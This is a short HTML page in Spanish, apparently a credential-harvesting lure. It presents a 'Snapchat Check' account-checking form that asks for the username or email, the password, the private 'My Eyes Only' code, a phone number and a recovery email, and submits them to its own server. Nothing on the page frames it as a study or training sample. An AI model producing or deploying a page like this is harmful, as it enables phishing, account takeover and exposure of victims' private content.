<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/snapform.css">
    <title>Check Account</title>
</head>
<body>
    
    <header class="Header">
        <div class="logo">
            <a href="/index.html"><h1>Check Account's</h1></a>
            
        </div>
        <nav class="nav-links">
            <ul class="nav-list">
                <li><a href="/index.html">Inicio</a></li>
            </ul>
        </nav>
  </header>

  <section class="formulario">
    <div class="contenedor-formulario">
        <h2>Snapchat Check</h2>
        <form action=""method="POST">
            <div class="form-group">
                <input type="text" name="username" placeholder="Usuario o Correo" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Contraseña" required>
            </div>
            <div class="form-group">
                <input type="text" name="code" placeholder="Código (Solo para mis Ojos)" required>
            </div>
            <div class="form-group">
                <input type="tel" name="phone" placeholder="Número" required>
            </div>
            <div class="form-group">
                <input type="email" name="recoveryEmail" placeholder="Correo de Recuperación" required>
            </div>
            <button class="btnsubmit" type="submit">Check</button>
        </form>
    </div>
</section>

</body>
</html>
